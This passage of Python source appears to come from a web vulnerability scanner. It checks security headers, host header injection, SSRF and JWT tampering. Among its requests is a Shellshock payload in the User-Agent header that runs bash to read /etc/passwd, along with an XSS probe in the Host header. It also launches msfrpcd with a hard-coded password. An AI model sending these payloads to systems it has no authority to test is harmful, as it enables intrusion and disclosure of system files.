	if "X-Forwarded-For" in str(data.headers):
		
		if "100.100.100.100" in str(data.headers["X-Forwarded-For"]):
			print(colored('{0:<40}'.format("X-Forwarded-For:"), 'white', attrs=['bold']), colored("Potentially vulnerable to IP Spoofing", 'red'))
			instance = "{}:{}".format(IP, loopPorts)

			if missingOrInsecureHeaders.get(instance):
				newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "X-Forwarded-For: Potential IP Spoofing")
				missingOrInsecureHeaders.update({instance:newValue})
			
			else:
				missingOrInsecureHeaders.update({instance:"X-Forwarded-For: Potential IP Spoofing"})

		elif "100.100.100.100" in str(data.headers)	or "100.100.100.100" in str(data.content):
			print(colored('{0:<40}'.format("X-Forwarded-For:"), 'white', attrs=['bold']), colored("Value reflected in response headers/content", 'red'))
			instance = "{}:{}".format(IP, loopPorts)

			if missingOrInsecureHeaders.get(instance):
				newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "X-Forwarded-For: Value reflected - Please check")
				missingOrInsecureHeaders.update({instance:newValue})
			
			else:
				missingOrInsecureHeaders.update({instance:"X-Forwarded-For: Value reflected - Please check"})
	else:
		print(colored('{0:<40}'.format("X-Forwarded-For:"), 'white', attrs=['bold']), colored("Not Implemented", 'yellow'))


def csp(data, IP, loopPorts):

	if "Content-Security-Policy" in str(data.headers):
		
		if "unsafe-inline" in str(data.headers["Content-Security-Policy"]) or  "unsafe-eval" in str(data.headers["Content-Security-Policy"]):
			print(colored('{0:<40}'.format("Content-Security-Policy:"), 'white', attrs=['bold']), colored("Misconfigured", 'red'))
			instance = "{}:{}".format(IP, loopPorts)

			if missingOrInsecureHeaders.get(instance):
				newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "Content-Security-Policy: Misconfigured")
				missingOrInsecureHeaders.update({instance:newValue})
			
			else:
				missingOrInsecureHeaders.update({instance:"Content-Security-Policy: Misconfigured"})

		else:
			print(colored('{0:<40}'.format("Content-Security-Policy:"), 'white', attrs=['bold']), colored("Set", 'green'))

	elif "content-security-policy" in str(data.headers):
		
		if "unsafe-inline" in str(data.headers["content-security-policy"]) or  "unsafe-eval" in str(data.headers["content-security-policy"]):
			print(colored('{0:<40}'.format("Content-Security-Policy:"), 'white', attrs=['bold']), colored("Misconfigured", 'red'))
			instance = "{}:{}".format(IP, loopPorts)

			if missingOrInsecureHeaders.get(instance):
				newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "Content-Security-Policy: Misconfigured")
				missingOrInsecureHeaders.update({instance:newValue})
			
			else:
				missingOrInsecureHeaders.update({instance:"Content-Security-Policy: Misconfigured"})

		else:
			print(colored('{0:<40}'.format("Content-Security-Policy:"), 'white', attrs=['bold']), colored("Set", 'green'))
			

	else:
		print(colored('{0:<40}'.format("Content-Security-Policy:"), 'white', attrs=['bold']), colored("Not implemented", 'red'))
		instance = "{}:{}".format(IP, loopPorts)

		if missingOrInsecureHeaders.get(instance):
			newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "Content-Security-Policy: Missing")
			missingOrInsecureHeaders.update({instance:newValue})
		
		else:
			missingOrInsecureHeaders.update({instance:"Content-Security-Policy: Missing"})


def clickjacking(data, IP, loopPorts):

	if "X-Frame-Options" in str(data.headers):
		
		if "deny" in str(data.headers["X-Frame-Options"]).lower() or "sameorigin" in str(data.headers["X-Frame-Options"]).lower() or "allow-from" in str(data.headers["X-Frame-Options"]).lower():
			
			if "*" in str(data.headers["X-Frame-Options"]).lower():
				print(colored('{0:<40}'.format("Clickjacking protection:"), 'white', attrs=['bold']), colored("Misconfigured X-Frame-Options header", 'red'))
				instance = "{}:{}".format(IP, loopPorts)

				if missingOrInsecureHeaders.get(instance):
					newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "X-Frame-Options: Misconfigured")
					missingOrInsecureHeaders.update({instance:newValue})
				
				else:
					missingOrInsecureHeaders.update({instance:"X-Frame-Options: Misconfigured"})
			
			else:
				print(colored('{0:<40}'.format("Clickjacking protection:"), 'white', attrs=['bold']), colored("X-Frame-Options header set", 'green'))
		
		else:	 
			print(colored('{0:<40}'.format("Clickjacking protection:"), 'white', attrs=['bold']), colored("Misconfigured X-Frame-Options header", 'red'))
			instance = "{}:{}".format(IP, loopPorts)
			
			if missingOrInsecureHeaders.get(instance):
				newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "X-Frame-Options: Misconfigured")
				missingOrInsecureHeaders.update({instance:newValue})
			
			else:
				missingOrInsecureHeaders.update({instance:"X-Frame-Options: Misconfigured"})

	elif "Content-Security-Policy" in str(data.headers):
		
		if "frame-ancestors" in str(data.headers["Content-Security-Policy"]):
			print(colored('{0:<40}'.format("Clickjacking protection:"), 'white', attrs=['bold']), colored("Content-Security-Policy Set with 'frame-ancestors' directive", 'green'))

	else:
		print(colored('{0:<40}'.format("Clickjacking protection:"), 'white', attrs=['bold']), colored("No protection found. Look for frame busting code", 'red'))
		instance = "{}:{}".format(IP, loopPorts)

		if missingOrInsecureHeaders.get(instance):
			newValue = "{}, {}".format(str(missingOrInsecureHeaders.get(instance)), "X-Frame-Options: Missing")
			missingOrInsecureHeaders.update({instance:newValue})
		
		else:
			missingOrInsecureHeaders.update({instance:"X-Frame-Options: Missing"})


def allSecurityHeaderChecks(data, IP, loopPorts, status):

	cacheControl(data, IP, loopPorts)

	originHeaderCORS(data, IP, loopPorts)

	xForwardedFor(data, IP, loopPorts)

	csp(data, IP, loopPorts)

	clickjacking(data, IP, loopPorts)

	hsts(data, IP, loopPorts, status)

	traceMethod(IP, loopPorts, status)
  

def allSecurityHeaders(IP, loopPorts, status, sessCookie):
	
	headers = {'Upgrade-Insecure-Requests':'1', 'Origin': 'www.custom-origin-header.com', 'X-Forwarded-For':'100.100.100.100', \
		'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',\
		'Accept-Encoding':'gzip, deflate',\
		'User-Agent':"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36",\
		'Connection': 'close'} 
	

	if "https" in status or "ssl" in status:
		
		SSLaddress = "https://{}:{}".format(IP, loopPorts)
		try:
			dataSSL = requests.get(SSLaddress, headers=headers, cookies=sessCookie, proxies=proxyDict, verify=False, allow_redirects=True, timeout=(5, 8))
			allSecurityHeaderChecks(dataSSL, IP, loopPorts, status)
		
		except Exception as e:
			  
			replace = 1
			proxyError(e, "", sessCookie)
			

	else:
		
		address = "http://{}:{}".format(IP, loopPorts)

		try:
			data = requests.get(address, headers=headers, proxies=proxyDict, verify=False, allow_redirects=True, timeout=(5, 8))
			allSecurityHeaderChecks(data, IP, loopPorts, status)
		
		except Exception as e:
			  
			replace = 1
			proxyError(e, "", sessCookie)
			


def BIGIPcookieInformationDisclosure(IP, port, status):
	
	import nmap

	argument = "-Pn -p 55553"

	nm = nmap.PortScanner()
	nm.scan('127.0.0.1', arguments=argument)

	p55553 = nm['127.0.0.1']['tcp'][55553]
	
	if p55553.get("state") == "open":
		print ("\t-> msfrpcd port open")
	else:
		print ("\t-> Starting msfrpcd on port 55553")
		os.system("msfrpcd -P toortoor")
	
	msfconsole(IP, port)

 

def socketRequestHelperMethod(IP, loopPorts, status, requestFrom):

	import socket, ssl

	if requestFrom == "iid":
		payload = "GET / HTTP/1.0\r\n\r\n"		
	elif requestFrom == "trace":
		payload = "TRACE / HTTP/1.1\r\nHost: {}\r\n\r\n".format(IP)


	if "https" in status or "ssl" in status:
		try:
			context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(5.0)
			s_sock = context.wrap_socket(s, server_hostname=IP)
			s_sock.connect((IP , int(loopPorts)))

			s_sock.sendall(payload.encode())
			http1_0 =  s_sock.recv(8192)
			http1_0 = http1_0.decode()
			if requestFrom == "iid":
				extractIP(http1_0, IP, loopPorts, "iid")
				extractPath(http1_0, IP, loopPorts, "iid")
			elif requestFrom == "trace":
				return http1_0

		except Exception as e:
			 
			exception = 1
			replace = 1

	else:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(5.0)
			s.connect((IP , int(loopPorts)))
			s.sendall(payload.encode())
			http1_0 =  s.recv(8192)
			http1_0 = http1_0.decode()
			if requestFrom == "iid":
				extractIP(http1_0, IP, loopPorts, "iid")
				extractPath(http1_0, IP, loopPorts, "iid")
			elif requestFrom == "trace":
				return http1_0

		except Exception as e:
			 
			exception = 1
			replace = 1


def internalIPAddressDisclosure(IP, loopPorts, status, sessCookie):

	socketRequestHelperMethod(IP, loopPorts, status, "iid")

  

def printVBS(resultST, resultVBS):

	if len(resultST) == 0:
		print(colored('{0:<40}'.format("Verbose Server Error:"), 'white', attrs=['bold']), colored("Not Vulnerable", 'green'))
	
	else:
		converted = ', '.join(resultST)
		print(colored('{0:<40}'.format("Verbose Server Error:"), 'white', attrs=['bold']), colored(converted, 'red'))

	if len(resultVBS) == 0:
		print(colored('{0:<40}'.format("Verbose Server Banner:"), 'white', attrs=['bold']), colored("Not Vulnerable", 'green'))

	else:
		converted = ', '.join(resultVBS)
		print(colored('{0:<40}'.format("Verbose Server Banner:"), 'white', attrs=['bold']), colored(converted, 'red'))


def verboseServerBannerCheck(data, IP, protocol, port, sessCookie):
	

	resultVBS = set()
	resultST = set()

	if "Server" in data.headers:
	
		if data.headers["Server"] != "":
			
			instance = "{}:{}".format(IP, port)
			banner = "Server: {}".format(data.headers["Server"])
			verboseServerBannerStore.update({instance:banner})

			resultVBS.add("Server: {}".format(str(data.headers['Server'])))
			

		if "X-AspNet-Version" in data.headers:
			if data.headers["X-AspNet-Version"] != "":

				resultVBS.add("X-AspNet-Version: {}".format(str(data.headers['X-AspNet-Version'])))
				instance = "{}:{}".format(IP, port)
				banner = "X-AspNet-Version: {}".format(data.headers["X-AspNet-Version"])
				verboseServerBannerStore.update({instance:banner})

		if "X-Powered-By" in data.headers:
			if data.headers["X-Powered-By"] != "":

				resultVBS.add("X-Powered-By: {}".format(str(data.headers['X-Powered-By'])))
				instance = "{}:{}".format(IP, port)
				banner = "X-Powered-By: {}".format(data.headers["X-Powered-By"])
				verboseServerBannerStore.update({instance:banner})

		customAddress = "http://{}/customdirectory".format(IP)
		customAddresshttps = "https://{}/customdirectory".format(IP)
		customAddress1 = "http://{}/customdirectory!@$%^&*()_+-=[]//|;':/,./><~`".format(IP)
		customAddresshttps1 = "https://{}/customdirectory!@$%^&*()_+-=[]//|;':/,./><~`".format(IP)
		customAddressUserAgent = "http://{}".format(IP)
		customAddresshttpsUserAgent = "https://{}".format(IP)

		headers = {'Host': IP, 'Upgrade-Insecure-Requests':'1', \
	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',\
	'Accept-Encoding':'gzip, deflate',\
	'User-Agent':"() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'",\
	'Connection': 'close'} 
		
		headers1 = {'Host': '<script>alert()</script>', 'Upgrade-Insecure-Requests':'1', \
	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',\
	'Accept-Encoding':'gzip, deflate',\
	'User-Agent':"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36",\
	'Connection': 'close'} 

	
		data = oneRequest(None, customAddress, sessCookie)

		try:
			if "apache" in str((data.content)).lower() or "asp.net" in str((data.content)).lower():

				resultVBS.add("Server Banner detected in Response")
				instance = "{}:{}".format(IP, port)
				verboseServerBannerContentStore.update({instance:str(data.request.headers)})

			if protocol == "https":
				data1 = oneRequest(None, customAddresshttps, sessCookie)

				if "apache" in str((data1.content)).lower() or "asp.net" in str((data1.content)).lower():

					resultVBS.add("Server Banner detected in Response")
					instance = "{}:{}".format(IP, port)
					verboseServerBannerContentStore.update({instance:str(data1.request.headers)})

			dataCustom = oneRequest(None, customAddress1, sessCookie)
			if "apache" in str((dataCustom.content)).lower() or "asp.net" in str((dataCustom.content)).lower():

				resultVBS.add("Server Banner detected in Response")
				instance = "{}:{}".format(IP, port)
				verboseServerBannerContentStore.update({instance:str(dataCustom.request.headers)})

			if protocol == "https":
				dataCustom1 = oneRequest(None, customAddresshttps1, sessCookie)

				if "apache" in str((dataCustom1.content)).lower() or "asp.net" in str((dataCustom1.content)).lower():

					resultVBS.add("Server Banner detected in Response")
					instance = "{}:{}".format(IP, port)
					verboseServerBannerContentStore.update({instance:str(dataCustom1.request.headers)})


			dataCustomUA = oneRequest(headers, customAddressUserAgent, sessCookie)

			if "stack trace" in str((dataCustomUA)).lower() or "exception" in str((dataCustomUA.content)).lower() or "javax.servlet" in str((dataCustomUA.content)).lower():
				
				resultST.add("Verbose Server Error detected in Response")
				instance = "{}:{}".format(IP, port)
				payload = "Possible Stack trace, please check\n\n{}".format(dataCustomUA.request.headers)
				verboseServerErrorStore.update({instance:str(dataCustomUA.request.headers)})

			if "apache" in str((dataCustomUA)).lower() or "asp.net" in str((dataCustomUA.content)).lower():

				resultVBS.add("Server Banner detected in Response")
				instance = "{}:{}".format(IP, port)
				verboseServerBannerContentStore.update({instance:str(dataCustomUA.request.headers)})


			dataCustomUA1 = oneRequest(headers, customAddressUserAgent, sessCookie)

			if "stack trace" in str((dataCustomUA1)).lower() or "exception" in str((dataCustomUA1.content)).lower() or "javax.servlet" in str((dataCustomUA1.content)).lower():

				resultST.add("Verbose Server Error detected in Response")
				instance = "{}:{}".format(IP, port)
				payload = "Possible Stack trace, please check\n\n{}".format(dataCustomUA1.request.headers)
				verboseServerErrorStore.update({instance:str(dataCustomUA1.request.headers)})

			if "apache" in str((dataCustomUA1)).lower() or "asp.net" in str((dataCustomUA1.content)).lower():

				resultVBS.add("Server Banner detected in Response")
				instance = "{}:{}".format(IP, port)
				verboseServerBannerContentStore.update({instance:str(dataCustomUA1.request.headers)})
			

			dataCustomHost = oneRequest(headers1, customAddressUserAgent, sessCookie)

			if "apache" in str((dataCustomHost)).lower() or "asp.net" in str((dataCustomHost.content)).lower():

				resultVBS.add("Server Banner detected in Response")
				instance = "{}:{}".format(IP, port)
				verboseServerBannerContentStore.update({instance:str(dataCustomHost.request.headers)})

			if protocol == "https":		
				dataCustomHost1 = oneRequest(headers1, customAddresshttpsUserAgent, sessCookie)

				if "apache" in str((dataCustomHost1)).lower() or "asp.net" in str((dataCustomHost1.content)).lower():

					resultVBS.add("Server Banner detected in Response")
					instance = "{}:{}".format(IP, port)
					verboseServerBannerContentStore.update({instance:str(dataCustomHost1.request.headers)})

		except Exception as e:
			 
			proxyError(e, "", sessCookie)
			replace = 1

		if data.status_code != 302:
			printVBS(resultST, resultVBS)

	

def VerboseServerBanner(IP, loopPorts, status, sessCookie):

	headers = {'Upgrade-Insecure-Requests':'1', \
'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',\
'Accept-Encoding':'gzip, deflate',\
'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',\
'Connection': 'close'} 


	if "https" in status or "ssl" in status: 

		SSLaddress = "https://{}:{}".format(IP, loopPorts)

		try:

			dataSSL = oneRequest(headers, SSLaddress, sessCookie)
			
			verboseServerBannerCheck(dataSSL, IP, status, loopPorts, sessCookie)
			extractPath(str(dataSSL.content), IP, loopPorts, "vsb")
			extractPath(str(dataSSL.headers), IP, loopPorts, "vsb")

			if dataSSL.status_code == 302:

				redirectData = allRedirectRequests(headers, IP, loopPorts, dataSSL, sessCookie)

				if redirectData == None:
					errorReceived = 1
				else:

					verboseServerBannerCheck(redirectData, IP, status, loopPorts,cookies)
					extractPath(str(redirectData.content), IP, loopPorts, "vsb")
					extractPath(str(redirectData.headers), IP, loopPorts, "vsb")

		except Exception as e:
			 
			proxyError(e, "", sessCookie)
			replace = 1
	
	else:
			
		address = "http://{}:{}".format(IP, loopPorts)

		try:

			data = oneRequest(headers, address, sessCookie)
			verboseServerBannerCheck(data, IP, "http", loopPorts, sessCookie)
			extractPath(str(data.content), IP, loopPorts, "vsb")
			extractPath(str(data.headers), IP, loopPorts, "vsb")

			if data.status_code == 302:

				redirectData = allRedirectRequests(headers, IP, loopPorts, data, sessCookie)

				if redirectData == None:
					errorReceived = 1
				else:
					verboseServerBannerCheck(redirectData, IP, status, loopPorts, sessCookie)
					extractPath(str(redirectData.content), IP, loopPorts, "vsb")
					extractPath(str(redirectData.headers), IP, loopPorts, "vsb")


		except Exception as e:
			 
			replace = 1
			proxyError(e, "", sessCookie)
						


  
def hostHeaderInjection(IP, loopPorts, status, sessCookie):


	headers = {'Host': 'www.oteri.com', 'Upgrade-Insecure-Requests':'1', \
'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',\
'Connection': 'close'} 

	resultHHI = set()

	if "https" in status or "ssl" in status:

		addreSSL = "https://{}:{}".format(IP, loopPorts)

		try:
			injectionSSL = oneRequest(headers, addreSSL, sessCookie)

			if "location" in str((injectionSSL.headers)).lower():

				if "oteri" in injectionSSL.headers['Location']:
					
					resultHHI.add("Vulnerable")
					instance = "{}:{}".format(IP, loopPorts)
					payloadLocation = "Reflected in the location header\n\nRequest Headers:\n{}".format(str(injectionSSL.request.headers))
					hostHeaderInjectionStore.update({instance:payloadLocation})

				if "oteri" in str(injectionSSL.content):

					resultHHI.add("Vulnerable")
					instance = "{}:{}".format(IP, loopPorts)
					payloadLocation = "Reflected in the body of the response\n\nRequest Headers:\n{}".format(str(injectionSSL.request.headers))
					hostHeaderInjectionStore.update({instance:payloadLocation})

		except requests.exceptions.RequestException as e:
			replace = 1
			exception = 1
			proxyError(e, "", sessCookie)

	else:

		address = "http://{}:{}".format(IP, loopPorts)
		#print(address)

		try:
			injection = oneRequest(headers, address, sessCookie)

			if "location" in str((injection.headers)).lower():

				if "oteri" in injection.headers['Location']:
					resultHHI.add("Vulnerable")
					instance = "{}:{}".format(IP, loopPorts)
					payloadLocation = "Reflected in the location header\n\nRequest Headers:\n{}".format(str(injection.request.headers))
					hostHeaderInjectionStore.update({instance:payloadLocation})

				if "oteri" in str(injection.content):
					
					resultHHI.add("Vulnerable")
					instance = "{}:{}".format(IP, loopPorts)
					payloadLocation = "Reflected in the body of the response\n\nRequest Headers:\n{}".format(str(injection.request.headers))
					hostHeaderInjectionStore.update({instance:payloadLocation})


		except requests.exceptions.RequestException as e:
			replace = 1
			exception = 1
			proxyError(e, "", sessCookie)
			
	if len(resultHHI) == 0:
		print(colored('{0:<40}'.format("Host Header Injection:"), 'white', attrs=['bold']), colored("Not Vulnerable", 'green'))
	
	else:
		converted = ', '.join(resultHHI)
		print(colored('{0:<40}'.format("Host Header Injection:"), 'white', attrs=['bold']), colored(converted, 'red'))



  
def	ssrf(IP, loopPorts, status, sessCookie):


	headers = {'Upgrade-Insecure-Requests':'1', \
'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',\
'Connection': 'close'} 

	headersValid = {'Host': '8.8.8.8', 'Upgrade-Insecure-Requests':'1', \
'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',\
'Connection': 'close'} 

	headersInvalid = {'Host': '8.8.8.81', 'Upgrade-Insecure-Requests':'1', \
'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',\
'Connection': 'close'} 

	headersValidloop = {'Host': '127.0.0.1', 'Upgrade-Insecure-Requests':'1', \
'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',\
'Connection': 'close'} 

	headersInvalidloop = {'Host': '127.0.0.11', 'Upgrade-Insecure-Requests':'1', \
'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',\
'Connection': 'close'} 

	resultS = set()

	status1 = ""
	status2 = ""
	status3 = ""
	status4 = ""


	if "https" in status or "ssl" in status:
	

		addreSSL = "https://{}:{}".format(IP, loopPorts)

		try:
			address = "https://{}:{}/http://www.google.com".format(IP, loopPorts)
			address1 = "https://{}:{}/http://www.oteri420.com".format(IP, loopPorts)

			injectionSSL = oneRequest(headersValid, address, sessCookie)
			injectionSSL1 = oneRequest(headersValid, address1, sessCookie)
			
			test1 = injectionSSL.status_code
			test2 = injectionSSL1.status_code

			if test1 != test2:
				resultS.add("Vulnerable")
				instance = "{}:{}".format(IP, loopPorts)
				payloadLocation = "Injected in URL\n\nURL: {}\nRequest Headers:\n{}\n\nURL: {}\nRequest Headers:\n{}".format(address, str(injectionSSL.request.headers), address1, str(injectionSSL1.request.headers))
				ssrfStore.update({instance:payloadLocation})

			if "Google Search" in str(injectionSSL.content) or "I'm Feeling Lucky" in str(injectionSSL.content):
				resultS.add("Vulnerable")
				instance = "{}:{}".format(IP, loopPorts)
				payloadLocation = "Injected in URL\n\nURL: {}\nRequest Headers:\n{}\n\nURL: {}\nRequest Headers:\n{}".format(address, str(injectionSSL.request.headers), address1, str(injectionSSL1.request.headers))
				ssrfStore.update({instance:payloadLocation})

			
			injectionSSL2 = oneRequest(headersValid, addreSSL, sessCookie)
			status1 = injectionSSL2.status_code

			injectionSSL3 = oneRequest(headersInvalid, addreSSL, sessCookie)
			status2 = injectionSSL3.status_code
			
			injectionSSL4 = oneRequest(headersInvalidloop, addreSSL, sessCookie)
			status3 = injectionSSL4.status_code

			
			injectionSSL5 = oneRequest(headersInvalidloop, addreSSL, sessCookie)
			status4 = injectionSSL5.status_code

			resultSSRF = set((status1, status2, status3, status4))


			if len(resultSSRF) > 1:

				if status1 == status3 and status2 == status4:
				
					resultS.add("Vulnerable")
					instance = "{}:{}".format(IP, loopPorts)
					payloadLocation = "Injected in the Host header\n\nURL: {}\nRequest Headers:\n{}\n\nURL: {}\n{}\n\nURL: {}\n{}\n\nURL: {}\n{}".format(addreSSL, str(injectionSSL2.request.headers), addreSSL, str(injectionSSL3.request.headers), addreSSL, str(injectionSSL4.request.headers), addreSSL, str(injectionSSL5.request.headers))
					ssrfStore.update({instance:payloadLocation})

		except requests.exceptions.RequestException as e:
			replace = 1
			exception = 1
			proxyError(e, "", sessCookie)


	else:

		#print(address)

		try:
			address = "http://{}:{}/http://www.google.com".format(IP, loopPorts)
			address1 = "http://{}:{}/http://www.oteri420.com".format(IP, loopPorts)

			injectionSSL = oneRequest(headersValid, address, sessCookie)
			injectionSSL1 = oneRequest(headersValid, address1, sessCookie)
			
			test1 = injectionSSL.status_code
			test2 = injectionSSL1.status_code

			if test1 != test2:
				resultS.add("Vulnerable")
				instance = "{}:{}".format(IP, loopPorts)
				payloadLocation = "Injected in URL\n\nURL: {}\nRequest Headers:\n{}\n\nURL: {}\n{}\n".format(address, str(injectionSSL.request.headers), address1, str(injectionSSL1.request.headers))
				ssrfStore.update({instance:payloadLocation})

				
			address = "http://{}:{}".format(IP, loopPorts)

			injectionSSL2 = oneRequest(headersValid, address, sessCookie)
			status1 = injectionSSL2.status_code


			injectionSSL3 = oneRequest(headersInvalid, address, sessCookie)
			status2 = injectionSSL3.status_code

			injectionSSL4 = oneRequest(headersValidloop, address, sessCookie)
			status3 = injectionSSL4.status_code


			injectionSSL5 = oneRequest(headersInvalidloop, address, sessCookie)
			status4 = injectionSSL5.status_code


			resultSSRF = set((status1, status2, status3, status4))

			if len(resultSSRF) > 1:
				
				if status1 == status3 and status2 == status4:
					
					resultS.add("Vulnerable")
					instance = "{}:{}".format(IP, loopPorts)
					payloadLocation = "Injected in the Host header\n\nURL: {}\nRequest Headers:\n{}\n\nURL: {}\n{}\n\nURL: {}\n{}\n\nURL: {}\n{}".format(address, str(injectionSSL2.request.headers), address, str(injectionSSL3.request.headers), address, str(injectionSSL4.request.headers), address, str(injectionSSL5.request.headers))
					ssrfStore.update({instance:payloadLocation})


		except requests.exceptions.RequestException as e:
			replace = 1
			exception = 1
			proxyError(e, "", sessCookie)
			

	resultSSRF = set()

	if len(resultS) == 0:
		print(colored('{0:<40}'.format("Server Side Request Forgery:"), 'white', attrs=['bold']), colored("Not Vulnerable", 'green'))
	
	else:
		converted = ', '.join(resultS)
		print(colored('{0:<40}'.format("Server Side Request Forgery:"), 'white', attrs=['bold']), colored(converted, 'red'))


#JWT Exploitation
def sendJWTRequest(new_jwt_value, args, vulnerability_Test):

	vuln = 0
	if args.url:
		pass
	else:
		print("Please enter the URL to test against")
		sys.exit()

	#JWT Token in cookie
	if args.c:
			#Headers for GET request
		if args.csrf:
			custom_Header = str(args.csrf).split(":")
			if custom_Header[1].startswith(" "):
				custom_Header[1] = custom_Header[1].lstrip()

			headers = {custom_Header[0]:custom_Header[1], 'Content-Type':'application/x-www-form-urlencoded','Upgrade-Insecure-Requests':'1', \
			'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',\
			'Connection': 'close'} 
		else:
			headers = {'Upgrade-Insecure-Requests':'1', 'Content-Type':'application/x-www-form-urlencoded', \
			'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',\
			'Connection': 'close'} 
	
		storePayload = {}
		new_StorePayload = {}
		#Check again
		jwtToken = str(args.jwt)

		if args.oc:
			payload = "{}; {}".format(jwtToken, str(args.oc))
			payload = payload.split(";")
			#print(payload)
			for i in payload:
				payload = i.lstrip()
				payload = payload.split("=")
				if payload != ['']:
					storePayload.update({payload[0]:payload[1]})
			#print(storePayload)

		else:
			cookie_send = str(args.jwt).split("=")
			if cookie_send[1].startswith(" "):
				cookie_send[1] = cookie_send[1].lstrip()
			
			storePayload = {cookie_send[0]:cookie_send[1]}
			#print(storePayload)
			#print(storePayload1)


		#GET Request
		original_token = requests.get(str(args.url), verify=False, cookies=storePayload, headers=headers, proxies=proxyDict, allow_redirects=False, timeout=(5, 8))
		#POST Request
		if args.post:
			try:
				data = ast.literal_eval(str(args.post))
			except:
				data = str(args.post)
				
		else:
			data = None

		if type(data) is dict:
			original_token_post = requests.post(str(args.url), verify=False, json=data, cookies=storePayload, headers=headers, proxies=proxyDict, allow_redirects=False, timeout=(5, 8))
		else:
			original_token_post = requests.post(str(args.url), verify=False, data=data, cookies=storePayload, headers=headers, proxies=proxyDict, allow_redirects=False, timeout=(5, 8))

		jwtToken = str(args.jwt)
		jwtToken = jwtToken.split("=")
		payload = "{}={}".format(jwtToken[0], new_jwt_value)
		
		if args.oc:
			payload = "{}; {}".format(payload, str(args.oc))
			payload = payload.split(";")

			for i in payload:
				payload = i.split("=")
				new_StorePayload.update({payload[0]:payload[1]})
		else:
			payload = payload.split("=")
			new_StorePayload.update({payload[0]:payload[1]})

		#GET Request
		modified_token = requests.get(str(args.url), verify=False, cookies=new_StorePayload, headers=headers, proxies=proxyDict, allow_redirects=False, timeout=(5, 8))
		#POST Request
		if args.post:
			try:
				data = ast.literal_eval(str(args.post))
			except:
				data = str(args.post)
		else:
			data = None

		if type(data) is dict:

			modified_token_post = requests.post(str(args.url), verify=False, json=data, cookies=new_StorePayload, headers=headers, proxies=proxyDict, allow_redirects=False, timeout=(5, 8))

		else:
			modified_token_post = requests.post(str(args.url), verify=False, data=data, cookies=new_StorePayload, headers=headers, proxies=proxyDict, allow_redirects=False, timeout=(5, 8))			



		#Check the difference in reponse length
		if len(modified_token.content) <= len(original_token.content) and original_token.status_code < 400 and modified_token.status_code < 400:
			diff = len(original_token.content) - len(modified_token.content)
			if str(modified_token.content) == str(original_token.content):
				vuln = 1
				#print("Same output for both requests")
		elif len(modified_token.content) >= len(original_token.content) and original_token.status_code < 400 and modified_token.status_code < 400:
			diff = len(modified_token.content) - len(original_token.content)
			if diff < 10: #Check if this should be changed
				if "error" in str(modified_token.content) or "unauthorized" in str(modified_token.content) or "401" in str(modified_token.content):
					pass
					#print("Request might have failed")
				else:
					vuln = 1
			else:
				pass


		if len(modified_token_post.content) <= len(original_token_post.content) and original_token_post.status_code < 400 and modified_token_post.status_code < 400:
			diff = len(original_token_post.content) - len(modified_token_post.content)
			if str(modified_token_post.content) == str(original_token_post.content):
				vuln = 1
				#print("Same output for both requests")
		elif len(modified_token_post.content) >= len(original_token_post.content) and original_token.status_code < 400 and modified_token.status_code < 400:
			diff = len(modified_token_post.content) - len(original_token_post.content)
			if diff < 10: #Check if this should be changed
				if "error" in str(modified_token_post.content) or "unauthorized" in str(modified_token_post.content) or "401" in str(modified_token_post.content):
					pass
					#print("Request might have failed")
				else:
					vuln = 1
			else:
				pass

#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

	#JWT Token in header
	if args.head:
		temp = str(args.jwt).split(":")
		if temp[1].startswith(" "):
			temp[1] = temp[1].lstrip()
		h = temp[1].split(" ")
		for header_payload in h:
			if "." in header_payload:
				payload = header_payload

		#Headers for request
		if args.csrf:
			custom_Header = str(args.csrf).split(":")
			if custom_Header[1].startswith(" "):
